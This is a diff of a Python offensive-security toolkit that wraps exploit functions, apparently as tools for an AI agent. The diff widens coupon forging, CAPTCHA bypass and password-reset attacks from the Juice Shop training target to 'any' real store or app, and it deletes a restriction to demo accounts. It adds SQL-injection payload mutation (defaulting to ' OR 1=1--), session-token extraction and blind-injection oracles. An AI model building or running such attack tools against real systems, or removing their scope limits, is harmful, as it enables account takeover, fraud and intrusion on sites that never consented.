@@ -4145,59 +4145,92 @@ def tool_xxe_payload(mode: str = "file_read",
         return {"ok": False, "error": f"xxe_payload failed: {e}"}
 
 
-def tool_coupon_forge(discount: Any = 20, campaign: str = "") -> Dict[str, Any]:
-    """Forge a Juice Shop discount coupon: z85(campaign+discount). The campaign
-    prefix is version-specific — read it from the target's main*.js and pass it
-    as campaign=. Without it you get the discount fragment only (honest, not a
-    guessed code)."""
+def tool_coupon_forge(mode: str = "tamper", discount: Any = 20,
+                      scheme: str = "z85", value: str = "") -> Dict[str, Any]:
+    """Discount/price/coupon abuse for ANY store. mode=tamper gives the
+    systematic price-logic tests (no app secret needed); mode=encode forges a
+    coupon once you know the target's scheme (z85|base64|base32|hex)."""
     try:
         _x = _exploits_mod()
     except Exception as e:
         return {"ok": False, "error": f"exploits module unavailable: {e}"}
     try:
-        return _x.coupon_forge(discount=_safe_int(discount, 20), campaign=campaign)
+        return _x.coupon_forge(mode=mode, discount=_safe_int(discount, 20),
+                               scheme=scheme, value=value)
     except Exception as e:
         return {"ok": False, "error": f"coupon_forge failed: {e}"}
 
 
-def tool_captcha_solve(base_url: str = "http://localhost:3000") -> Dict[str, Any]:
-    """Auto-read the arithmetic CAPTCHA: GET {base_url}/rest/captcha and return
-    the answer + captchaId to submit. Juice Shop serves the captcha in plaintext
-    — reading it is the intended anti-automation bypass. Non-eval arithmetic
-    parser, so target text is never executed."""
+def tool_captcha_solve(url: str = "", captcha_text: str = "",
+                       base_url: str = "") -> Dict[str, Any]:
+    """Solve a text/arithmetic CAPTCHA from ANY app. Give it either the captcha
+    TEXT directly (captcha_text=, if you already have the response) or a URL to
+    fetch it from (url=). Works on any simple math CAPTCHA, not one product's
+    endpoint. Non-eval parser — target text is never executed."""
     import json as _json
-    base = (base_url or "http://localhost:3000").strip().rstrip("/")
-    url = base + "/rest/captcha"
-    if not _fetch_target_host_ok(url):
+    if captcha_text:
+        try:
+            return _exploits_mod().captcha_solve(captcha_text)
+        except Exception as e:
+            return {"ok": False, "error": f"captcha_solve failed: {e}"}
+    # else fetch it. Accept a full url; fall back to base_url + the common path.
+    target = (url or "").strip()
+    if not target and base_url:
+        target = base_url.strip().rstrip("/") + "/rest/captcha"
+    if not target:
+        return {"ok": False, "error": "give me captcha_text=<the challenge text> "
+                "or url=<endpoint that returns it>"}
+    if not _fetch_target_host_ok(target):
         return {"ok": False, "error": "refusing a link-local/metadata address "
-                "(SSRF guard) — point base_url at your real target"}
+                "(SSRF guard) — point url at your real target"}
     try:
-        req = urllib.request.Request(url, headers={"Accept": "application/json"})
+        req = urllib.request.Request(target, headers={"Accept": "*/*"})
         with urllib.request.urlopen(req, timeout=20) as r:
-            payload = _json.loads(r.read())
+            raw = r.read()
+        try:
+            payload = _json.loads(raw)
+        except Exception:
+            payload = raw.decode("utf-8", "replace")
     except Exception as e:
-        return {"ok": False, "error": f"could not read the captcha at {url}: {e}"}
+        return {"ok": False, "error": f"could not read the captcha at {target}: {e}"}
     try:
-        _x = _exploits_mod()
-        return _x.captcha_solve(payload)
+        return _exploits_mod().captcha_solve(payload)
     except Exception as e:
         return {"ok": False, "error": f"captcha_solve failed: {e}"}
 
 
-def tool_reset_password(email: str = "",
+def tool_reset_password(mode: str = "methodology", email: str = "",
                         new_password: str = "Pwned123!") -> Dict[str, Any]:
-    """Plan a security-question password reset for a Juice Shop DEMO account
-    (the reset-password CTF challenges). Bound to the published demo accounts
-    only — it won't fabricate an answer for an arbitrary email. Returns the
-    reset endpoint + body; you send it through the gate."""
+    """Attack a password-reset flow on ANY app. mode=methodology gives the
+    systematic reset-flow attacks (host-header injection, token entropy, user
+    enumeration, security-question weakness, flow tampering, rate-limit). Works
+    on a target you've never seen. mode=practice = public seeds for the OWASP
+    Juice Shop training target only."""
     try:
         _x = _exploits_mod()
     except Exception as e:
         return {"ok": False, "error": f"exploits module unavailable: {e}"}
     try:
-        return _x.reset_password_plan(email=email, new_password=new_password)
+        return _x.reset_password_plan(mode=mode, email=email,
+                                      new_password=new_password)
     except Exception as e:
         return {"ok": False, "error": f"reset_password_plan failed: {e}"}
+
+
+def tool_business_logic(area: str = "all") -> Dict[str, Any]:
+    """The systematic hunt for BUSINESS-LOGIC and novel multi-step flaws — the
+    bugs no canned payload can find because they live in the specific app's
+    rules. Turns 'no tool for this' into a concrete checklist you drive with
+    recon + run. This is what carries the tool on a real, custom target.
+    area: all | pricing | workflow | race | authz | account | input | trust."""
+    try:
+        _x = _exploits_mod()
+    except Exception as e:
+        return {"ok": False, "error": f"exploits module unavailable: {e}"}
+    try:
+        return _x.business_logic(area=area)
+    except Exception as e:
+        return {"ok": False, "error": f"business_logic failed: {e}"}
 
 
 # ── 6-star arsenal wrappers (all pure payload/analysis generators) ──
@@ -4298,6 +4331,41 @@ def tool_trick_detect(text: str = "") -> Dict[str, Any]:
     data, comments, client-side-only checks, tokens, rate limits, hashes. Run it
     FIRST on anything confusing; returns each gotcha + what to do."""
     return _exp_call("trick_detect", text=text)
+
+
+def tool_payload_mutate(body: str = "", payload: str = "' OR 1=1--",
+                        fmt: str = "auto", mode: str = "replace") -> Dict[str, Any]:
+    """Structural (AST) payload injection — parse a STRUCTURED request (JSON/XML/
+    form/query), inject the payload at EVERY node, and serialise back to valid
+    syntax. For nested real-world inputs where a flat string breaks the parser or
+    misses the field. Returns one valid mutated request per injection point.
+    fmt: auto|json|xml|form|query. mode: replace|append|key."""
+    return _exp_call("payload_mutate", body=body, payload=payload, fmt=fmt, mode=mode)
+
+
+def tool_session_flow(mode: str = "extract", response: str = "",
+                      flow: str = "") -> Dict[str, Any]:
+    """State-machine & session management for multi-step targets. mode=extract
+    pulls every dynamic token from a response (cookies, CSRF, bearer/JWT, nonces)
+    and says how to carry each into the next request; mode=plan lays out a
+    sequence-dependent flow (which step produces a token the next consumes).
+    Essential for vulns that sit behind a login/cart/checkout sequence with
+    rotating tokens."""
+    return _exp_call("session_flow", mode=mode, response=response, flow=flow)
+
+
+def tool_oracle_analyze(mode: str = "diff", baseline: str = "", test: str = "",
+                        baseline_status: Any = 0, test_status: Any = 0,
+                        baseline_times: Any = "", payload_times: Any = "") -> Dict[str, Any]:
+    """Blind-injection oracles for true black-box work — judge success by
+    MEASURING the response, not a scoreboard. mode=diff does differential analysis
+    (length/status/DOM/similarity) to tell you if TRUE vs FALSE responses are
+    distinguishable (a working boolean oracle); mode=timing does statistical
+    latency analysis (mean/stdev/z-score) to confirm time-based blind SQLi/RCE
+    past network jitter. Take several samples for timing."""
+    return _exp_call("oracle_analyze", mode=mode, baseline=baseline, test=test,
+                     baseline_status=baseline_status, test_status=test_status,
+                     baseline_times=baseline_times, payload_times=payload_times)
 
 
 def tool_webapp_recon(base_url: str = "http://localhost:3000",
